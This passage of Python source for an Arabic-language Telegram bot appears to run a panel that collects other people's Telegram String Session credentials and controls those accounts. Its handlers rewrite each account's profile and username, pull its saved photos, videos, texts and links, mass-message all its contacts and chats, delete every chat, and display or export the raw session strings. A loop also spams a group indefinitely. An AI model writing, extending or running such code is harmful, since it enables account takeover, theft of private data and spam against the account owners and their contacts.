                            await x.send_message("✅ تم تغيير الصورة بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                        except Exception as e:
                            await x.send_message(f"❌ حدث خطأ: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                        finally:
                            await app.disconnect()
                        break

        elif data.startswith("change_bio_"):
            phone_number = data.split("_")[-1]
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("📜 أرسل السيرة الذاتية الجديدة:")
                new_bio = await x.get_response()

                for account in accounts:
                    if account['phone_number'] == phone_number:
                        app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                        await app.connect()
                        try:
                            await app(functions.account.UpdateProfileRequest(about=new_bio.text))
                            await x.send_message("✅ تم تغيير السيرة الذاتية بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                        except Exception as e:
                            await x.send_message(f"❌ حدث خطأ: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                        finally:
                            await app.disconnect()
                        break

        elif data.startswith("change_username_"):
            phone_number = data.split("_")[-1]
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("👤 أرسل اسم المستخدم الجديد:")
                new_username = await x.get_response()

                for account in accounts:
                    if account['phone_number'] == phone_number:
                        app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                        await app.connect()
                        try:
                            await app(functions.account.UpdateUsernameRequest(username=new_username.text))
                            await x.send_message("✅ تم تغيير اسم المستخدم بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                        except Exception as e:
                            if 'USERNAME_OCCUPIED' in str(e):
                                await x.send_message("❌ هذا الاسم المستخدم محجوز. اختر اسمًا آخر.", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                            elif 'USERNAME_INVALID' in str(e):
                                await x.send_message("❌ اسم المستخدم غير صالح. حاول مرة أخرى.", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                            else:
                                await x.send_message(f"❌ حدث خطأ: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                        finally:
                            await app.disconnect()
                        break

        elif data.startswith("fetch_saved_messages_"):
            phone_number = data.split("_")[-1]
            await event.edit("📥 اختر نوع الرسائل المحفوظة التي تريد جلبها:", buttons=[
                [Button.inline("🖼️ الصور", data=f"fetch_saved_pictures_{phone_number}")],
                [Button.inline("🎥 الفيديوهات", data=f"fetch_saved_videos_{phone_number}")],
                [Button.inline("📝 النصوص", data=f"fetch_saved_texts_{phone_number}")],
                [Button.inline("🔗 الروابط", data=f"fetch_saved_links_{phone_number}")],
                [Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]
            ])

        elif data.startswith("fetch_saved_pictures_"):
            phone_number = data.split("_")[-1]
            await event.edit("🔄 جاري جلب الصور المحفوظة...")
            for account in accounts:
                if account['phone_number'] == phone_number:
                    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        messages = await app.get_messages("me", limit=100, filter=types.InputMessagesFilterPhotos)
                        if messages:
                            await app.send_file(event.chat_id, [msg.media for msg in messages], caption="📥 هذه هي الصور المحفوظة.")
                        else:
                            await event.edit("❌ لا توجد صور محفوظة.", buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                    except Exception as e:
                        await event.edit(f"❌ حدث خطأ: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("fetch_saved_videos_"):
            phone_number = data.split("_")[-1]
            await event.edit("🔄 جاري جلب الفيديوهات المحفوظة...")
            for account in accounts:
                if account['phone_number'] == phone_number:
                    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        messages = await app.get_messages("me", limit=100, filter=types.InputMessagesFilterVideo)
                        if messages:
                            await app.send_file(event.chat_id, [msg.media for msg in messages], caption="📥 هذه هي الفيديوهات المحفوظة.")
                        else:
                            await event.edit("❌ لا توجد فيديوهات محفوظة.", buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                    except Exception as e:
                        await event.edit(f"❌ حدث خطأ: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("fetch_saved_texts_"):
            phone_number = data.split("_")[-1]
            await event.edit("🔄 جاري جلب النصوص المحفوظة...")
            for account in accounts:
                if account['phone_number'] == phone_number:
                    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        messages = await app.get_messages("me", limit=100)
                        texts = [msg.message for msg in messages if msg.message]
                        if texts:
                            await event.edit("📝 **النصوص المحفوظة**:\n" + "\n".join(texts[:10]), buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                        else:
                            await event.edit("❌ لا توجد نصوص محفوظة.", buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                    except Exception as e:
                        await event.edit(f"❌ حدث خطأ: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("fetch_saved_links_"):
            phone_number = data.split("_")[-1]
            await event.edit("🔄 جاري جلب الروابط المحفوظة...")
            for account in accounts:
                if account['phone_number'] == phone_number:
                    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        messages = await app.get_messages("me", limit=100)
                        links = [msg.message for msg in messages if msg.message and "http" in msg.message]
                        if links:
                            await event.edit("🔗 **الروابط المحفوظة**:\n" + "\n".join(links[:10]), buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                        else:
                            await event.edit("❌ لا توجد روابط محفوظة.", buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                    except Exception as e:
                        await event.edit(f"❌ حدث خطأ: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data=f"fetch_saved_messages_{phone_number}")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("broadcast_message_"):
            phone_number = data.split("_")[-1]
            await event.edit("📢 اختر نوع الإرسال:", buttons=[
                [Button.inline("👥 جهات الاتصال فقط", data=f"broadcast_contacts_{phone_number}")],
                [Button.inline("💬 محادثاتي الخاصة فقط", data=f"broadcast_private_{phone_number}")],
                [Button.inline("📨 محادثاتي وجهاتي", data=f"broadcast_all_{phone_number}")],
                [Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]
            ])

        elif data.startswith("broadcast_contacts_") or data.startswith("broadcast_private_") or data.startswith("broadcast_all_"):
            phone_number = data.split("_")[-1]
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("📢 أرسل الرسالة التي ترغب في إرسالها:")
                broadcast_msg = await x.get_response()

                for account in accounts:
                    if account['phone_number'] == phone_number:
                        app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                        await app.connect()
                        try:
                            dialogs = await app.get_dialogs()
                            success_count = 0
                            failure_count = 0
                            total_chats = 0

                            progress_message = await x.send_message(
                                f"🔄 جاري المعالجة...\n"
                                f"عدد المحادثات الكلي: {total_chats}\n"
                                f"تم إرسالها حتى الآن: {success_count}\n"
                                f"فشل الإرسال: {failure_count}"
                            )

                            if "contacts" in data:
                                contacts = await app(functions.contacts.GetContactsRequest(hash=0))
                                total_chats = len(contacts.users)
                                for contact in contacts.users:
                                    try:
                                        await app.send_message(contact.id, broadcast_msg.text)
                                        success_count += 1
                                    except Exception:
                                        failure_count += 1

                                    await progress_message.edit(
                                        f"🔄 جاري المعالجة...\n"
                                        f"عدد المحادثات الكلي: {total_chats}\n"
                                        f"تم إرسالها حتى الآن: {success_count}\n"
                                        f"فشل الإرسال: {failure_count}"
                                    )

                            elif "private" in data:
                                private_chats = [d for d in dialogs if isinstance(d.entity, types.User) and not d.entity.bot]
                                total_chats = len(private_chats)
                                for dialog in private_chats:
                                    try:
                                        await app.send_message(dialog.id, broadcast_msg.text)
                                        success_count += 1
                                    except Exception:
                                        failure_count += 1

                                    await progress_message.edit(
                                        f"🔄 جاري المعالجة...\n"
                                        f"عدد المحادثات الكلي: {total_chats}\n"
                                        f"تم إرسالها حتى الآن: {success_count}\n"
                                        f"فشل الإرسال: {failure_count}"
                                    )

                            elif "all" in data:
                                total_chats = len(dialogs)
                                for dialog in dialogs:
                                    try:
                                        await app.send_message(dialog.id, broadcast_msg.text)
                                        success_count += 1
                                    except Exception:
                                        failure_count += 1

                                    await progress_message.edit(
                                        f"🔄 جاري المعالجة...\n"
                                        f"عدد المحادثات الكلي: {total_chats}\n"
                                        f"تم إرسالها حتى الآن: {success_count}\n"
                                        f"فشل الإرسال: {failure_count}"
                                    )

                            await x.send_message(
                                f"✅ تم إرسال الرسالة بنجاح!\n\n"
                                f"📬 **عدد الرسائل الناجحة**: {success_count}\n"
                                f"⚠️ **عدد الرسائل الفاشلة**: {failure_count}",
                                buttons=[[Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]]
                            )
                        except Exception as e:
                            await x.send_message(f"❌ حدث خطأ أثناء إرسال الرسالة: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]])
                        finally:
                            await app.disconnect()
                        break

        elif data.startswith("delete_all_chats_"):
            phone_number = data.split("_")[-1]
            await event.edit("🔄 جاري حذف جميع المحادثات...")
            for account in accounts:
                if account['phone_number'] == phone_number:
                    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        dialogs = await app.get_dialogs()
                        deleted_count = 0
                        total_chats = len(dialogs)

                        progress_message = await event.edit(
                            f"🔄 جاري حذف جميع المحادثات...\n"
                            f"عدد المحادثات الكلي: {total_chats}\n"
                            f"تم حذفها حتى الآن: {deleted_count}"
                        )

                        for dialog in dialogs:
                            try:
                                await app.delete_dialog(dialog)
                                deleted_count += 1

                                await progress_message.edit(
                                    f"🔄 جاري حذف جميع المحادثات...\n"
                                    f"عدد المحادثات الكلي: {total_chats}\n"
                                    f"تم حذفها حتى الآن: {deleted_count}"
                                )
                            except Exception as e:
                                print(f"Error while deleting chat: {e}")

                        await event.edit(
                            f"✅ تم حذف جميع المحادثات بنجاح!\n"
                            f"عدد المحادثات المحذوفة: {deleted_count}",
                            buttons=[[Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]]
                        )
                    except Exception as e:
                        await event.edit(f"❌ حدث خطأ أثناء حذف المحادثات: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("extract_session_"):
            phone_number = data.split("_")[-1]
            for i in accounts:
                if phone_number == i['phone_number']:
                    session_str = i['session']
                    await event.edit(
                        f"📋 **جلسة الحساب**: `{phone_number}`\n\n"
                        f"`{session_str}`",
                        buttons=[[Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]]
                    )
                    break

        elif data == "control_panel":
            control_buttons = [
                [Button.inline("💾 إنشاء نسخة احتياطية", data="backup")],
                [Button.inline("📂 استعادة نسخة احتياطية", data="restore")],
                [Button.inline("🗑️ حذف جميع الأحداث", data="delete_all_events")],
                [Button.inline("🔍 فحص الكل", data="check_all")],
                [Button.inline("📊 الإحصائيات", data="statistics")],
                [Button.inline("🔄 تصفير الإحصائيات", data="reset_stats")],
                [Button.inline("📰 الأحداث", data="events")],
                [Button.inline("🚫 منع دولة", data="ban_country")],
                [Button.inline("🌍 الدول الممنوعة", data="view_banned_countries")],
                [Button.inline("🔙 رجوع", data="main_menu")]
            ]
            await event.edit("⚙️ إليك قائمة التحكم:", buttons=control_buttons)

        elif data == "set_notification_channel":
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("👥 أرسل رابط القناة لتعيينها كقناة إشعارات:")
                response = await x.get_response()
                channel_link = response.text.strip()
                try:
                    channel = await bot(functions.channels.GetChannelsRequest([channel_link]))
                    channel_id = channel.chats[0].id
                    self_entity = await bot.get_me()
                    permissions = await bot(functions.channels.GetParticipantRequest(channel=channel_id, participant=self_entity))
                    if isinstance(permissions.participant, types.ChannelParticipantAdmin):
                        db.set("notification_channel", channel_id)
                        await bot.send_message(channel_id, "📢 تم تعيين هذه القناة كقناة إشعارات.")
                        await x.send_message(f"✅ تم تعيين قناة الإشعارات بنجاح: {channel_link}", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                    else:
                        await x.send_message("❌ البوت ليس مشرفًا في هذه القناة. يرجى التحقق من الصلاحيات.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                        await bot.send_message(ADMIN_ID, f"⚠️ البوت ليس مشرفًا في القناة: {channel_link}.")
                except (ChatAdminRequiredError, ChatWriteForbiddenError, UserNotParticipantError):
                    await x.send_message("❌ لا يمكن الوصول إلى القناة أو الكتابة فيها. يرجى التحقق من الصلاحيات.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "delete_all_events":
            db.set("events", [])
            await event.edit("🗑️ تم حذف جميع الأحداث بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "reset_stats":
            db.set("events", [])
            db.set("users", {})
            db.set("submission_results", {"successful": [], "failed": [], "pending": []})
            await event.edit("✅ تم تصفير الإحصائيات بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "check_all":
            all_accounts = accounts
            if not all_accounts:
                await event.edit(
                    "🔍 لا توجد حسابات للفحص.",
                    buttons=[[Button.inline("🔙 رجوع", data="main_menu")]]
                )
                return

            await event.edit("🔍 جاري الفحص...")
            active_accounts = []
            inactive_accounts_global = []

            async def check_account(account):
                app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                try:
                    await app.connect()
                    sessions = await app(functions.account.GetAuthorizationsRequest())
                    device_count = len(sessions.authorizations)
                    active_accounts.append(f"📞 {account['phone_number']} - 📱 {device_count} أجهزة")
                except (AuthKeyUnregisteredError, SessionRevokedError, UserDeactivatedError, AuthKeyDuplicatedError):
                    inactive_accounts_global.append(account['phone_number'])
                finally:
                    await app.disconnect()

            batch_size = 10
            for i in range(0, len(all_accounts), batch_size):
                tasks = [check_account(account) for account in all_accounts[i:i + batch_size]]
                await asyncio.gather(*tasks)

            for start in range(0, len(active_accounts), 20):
                await bot.send_message(
                    int(user_id),
                    "🟢 **الحسابات الشغالة**:\n" + "\n".join(active_accounts[start:start + 20])
                )

            for start in range(0, len(inactive_accounts_global), 20):
                await bot.send_message(
                    int(user_id),
                    "🔴 **الحسابات المفقودة**:\n" + "\n".join(inactive_accounts_global[start:start + 20]),
                    buttons=[[Button.inline("🗑️ إزالة من القائمة", data="remove_inactive_accounts")]]
                )

            await event.edit("✅ تم الفحص بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "remove_inactive_accounts":
            accounts = [acc for acc in accounts if acc['phone_number'] not in inactive_accounts_global]
            db.set("accounts", accounts)
            await event.edit("🗑️ تم إزالة الحسابات المفقودة من القائمة.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "backup":
            backup_data = {"accounts": accounts, "users": users, "notification_channel": notification_channel}
            with open(f"database/backup.json", "w") as backup_file:
                json.dump(backup_data, backup_file)
            await bot.send_file(int(user_id), f"database/backup.json", caption="✅ تم إنشاء نسخة احتياطية بنجاح!\n\n" \
                                                                                 f"عدد الحسابات المخزنة: {len(accounts)}\n" \
                                                                                 "⚠️ يجب عليك الاحتفاظ بملف النسخة الاحتياطية وعدم مشاركته مع أي شخص!")

        elif data == "restore":
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("📂 أرسل ملف النسخة الاحتياطية (backup.json)")
                response = await x.get_response()
                if response.file and response.file.name == "backup.json":
                    await bot.download_media(response, f"database/backup.json")
                    with open(f"database/backup.json", "r") as backup_file:
                        backup_data = json.load(backup_file)
                    db.set("accounts", backup_data["accounts"])
                    db.set("users", backup_data["users"])
                    db.set("notification_channel", backup_data.get("notification_channel"))
                    restored_count = len(backup_data["accounts"])
                    log_event("استعادة نسخة احتياطية", user_id, f"عدد الحسابات: {restored_count}")
                    await x.send_message(f"✅ تم استعادة النسخة الاحتياطية بنجاح!\n\n" \
                                         f"عدد الحسابات المستعادة: {restored_count}", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                else:
                    await x.send_message("❌ الملف المرسل غير صحيح أو غير مسموح به. يرجى إرسال ملف النسخة الاحتياطية الصحيح.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "statistics":
            await event.edit("جاري جلب الإحصائيات...")
            await asyncio.sleep(1)

            user_stats = sorted(users.items(), key=lambda x: len(x[1].get("submitted_accounts", [])), reverse=True)
            top_users = user_stats[:10]
            total_users = len(users)
            total_reports = len(reports)
            total_events = len(db.get("events"))
            total_received_accounts = len(accounts)

            last_received_accounts = accounts[-5:] if len(accounts) > 5 else accounts

            stats_text = "📊 **إحصائيات الحسابات والمستخدمين**:\n\n"
            stats_text += f"👥 **إجمالي المستخدمين المسجلين**: {total_users}\n"
            stats_text += f"📨 **إجمالي التقارير المقدمة**: {total_reports}\n"
            stats_text += f"📰 **إجمالي الأحداث المسجلة**: {total_events}\n"
            stats_text += f"📥 **إجمالي الحسابات المستلمة**: {total_received_accounts}\n\n"

            stats_text += "🏆 **أكثر 10 مستخدمين قاموا بتسليم حسابات**:\n"
            for idx, (user_id, user_data) in enumerate(top_users, start=1):
                user_name = (await bot.get_entity(int(user_id))).first_name
                stats_text += f"{idx}. [{user_name}](tg://user?id={user_id}) - {len(user_data.get('submitted_accounts', []))} حسابات\n"

            stats_text += "\n📋 **آخر الحسابات المستلمة**:\n"
            for account in last_received_accounts:
                stats_text += f"- {account['phone_number']}\n"

            await event.edit(stats_text, buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "events":
            events = db.get("events")
            if not events:
                await event.edit("📰 لا توجد أحداث مسجلة حاليًا.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                return

            events_text = "📰 **الأحداث المسجلة**:\n"
            for e in events[-10:]:
                events_text += f"- {e['user']} قام بـ {e['action']} {e['details']}\n"

            await event.edit(events_text, buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "ban_country":
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("🚫 أرسل رمز الدولة (مثل +20) لمنع استلام الأرقام منها:")
                response = await x.get_response()
                country_code = response.text.strip()
                if country_code.startswith("+") and country_code[1:].isdigit():
                    banned_countries.append(country_code)
                    db.set("banned_countries", banned_countries)
                    await x.send_message(f"✅ تم منع استلام الأرقام من الدولة: {country_code}", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                else:
                    await x.send_message("❌ رمز الدولة غير صالح. يرجى المحاولة مرة أخرى.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "view_banned_countries":
            if not banned_countries:
                await event.edit("🌍 لا توجد دول ممنوعة حاليًا.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
            else:
                buttons = [[Button.inline(f"🚫 {code}", data=f"unban_{code}")] for code in banned_countries]
                buttons.append([Button.inline("🔙 رجوع", data="main_menu")])
                await event.edit("🌍 **الدول الممنوعة حاليًا**:\n\n" + "\n".join(f"- {code}" for code in banned_countries), buttons=buttons)

        elif data.startswith("unban_"):
            country_code = data.split("_")[1]
            if country_code in banned_countries:
                banned_countries.remove(country_code)
                db.set("banned_countries", banned_countries)
                await event.edit(f"✅ تم إزالة الحظر عن الدولة: {country_code}", buttons=[[Button.inline("🔙 رجوع", data="view_banned_countries")]])

        elif data.startswith("delete_account_"):
            phone_number = data.split("_")[-1]
            accounts = [acc for acc in accounts if acc['phone_number'] != phone_number]
            db.set("accounts", accounts)
            await event.edit(f"🗑️ تم حذف الحساب `{phone_number}` من القائمة.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "add_sessions_to_file":
            with open('database/session.txt', 'w', encoding='utf-8') as f:
                for account in accounts:
                    f.write(f"{account['session']}\n")
                f.write(f"\nعدد الجلسات: {len(accounts)}")
            await bot.send_file(int(user_id), 'database/session.txt', caption="✅ تم إضافة الجلسات إلى الملف بنجاح!")

        elif data == "submit_session":
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("💼 أرسل جلسة String Session:")
                session = await x.get_response()
                session_str = session.text.strip()

                try:
                    app = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                    await app.connect()
                    user_info = await app.get_me()
                    phone_number = user_info.phone
                    accounts.append({"phone_number": phone_number, "session": session_str, "user_id": user_id})
                    db.set("accounts", accounts)
                    await ensure_channel_membership({"session": session_str, "phone_number": phone_number}, CHANNEL_USERNAME)
                    await x.send_message("✅ تم استلام الجلسة والتحقق منها بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                except Exception as e:
                    await x.send_message(f"❌ حدث خطأ أثناء التحقق من الجلسة: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                finally:
                    await app.disconnect()

        elif data.startswith("repeat_action_"):
            phone_number = data.split("_")[-1]
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("📢 أرسل الرسالة التي ترغب في تكرارها:")
                repeat_message = await x.get_response()

                await x.send_message("⏰ أرسل الوقت بين التكرارات (بالثواني):")
                interval_response = await x.get_response()

                try:
                    interval = int(interval_response.text)
                    if interval <= 0:
                        await x.send_message("❌ يجب أن يكون الوقت أكبر من 0.")
                        return
                except ValueError:
                    await x.send_message("❌ الرجاء إدخال قيمة صحيحة.")
                    return

                await x.send_message("🔗 أرسل رابط المجموعة أو اسم المستخدم:")
                group_response = await x.get_response()
                group_link = group_response.text.strip()

                repeat_tasks[event.chat_id] = {
                    "message": repeat_message.text,
                    "interval": interval,
                    "group": group_link,
                    "count": 0
                }

                while True:
                    await bot.send_message(group_link, repeat_message.text)
                    repeat_tasks[event.chat_id]["count"] += 1
                    await bot.send_message(event.chat_id, f"التكرار المطلوب: {repeat_tasks[event.chat_id]['count']}\nتم تكرار حتى الآن: {repeat_tasks[event.chat_id]['count']}")
                    await asyncio.sleep(interval)

    except MessageNotModifiedError:
        pass
    except QueryIdInvalidError:
        print("Query ID is invalid.")
    except ReplyMarkupInvalidError:
        print("The provided reply markup is invalid.")
    except Exception as e:
        await event.answer(f"⚠️ حدث خطأ: {str(e)}", alert=True)

async def handle_session_revoked(phone_number, event):
    retry_counts = db.get("retry_counts")
    current_retry_count = retry_counts.get(phone_number, 0) + 1
    retry_counts[phone_number] = current_retry_count
    db.set("retry_counts", retry_counts)

    await event.edit(
        f"فقدان الوصول إلى الحساب `{phone_number}`. قد يكون تم حظره من شركة تليجرام أو تمت إزالة البوت منه.\n"
        f"يرجى التحقق قبل حذفه من القائمة. لقد حاولت حتى الآن ({current_retry_count}) مرات.",
        buttons=[
            [Button.inline("حذف من القائمة", data=f"delete_account_{phone_number}")],
            [Button.inline("إعادة المحاولة", data=f"verify_session_{phone_number}_retry")],
            [Button.inline("🔙 رجوع", data="main_menu")]
        ]
    )

bot.run_until_disconnected()
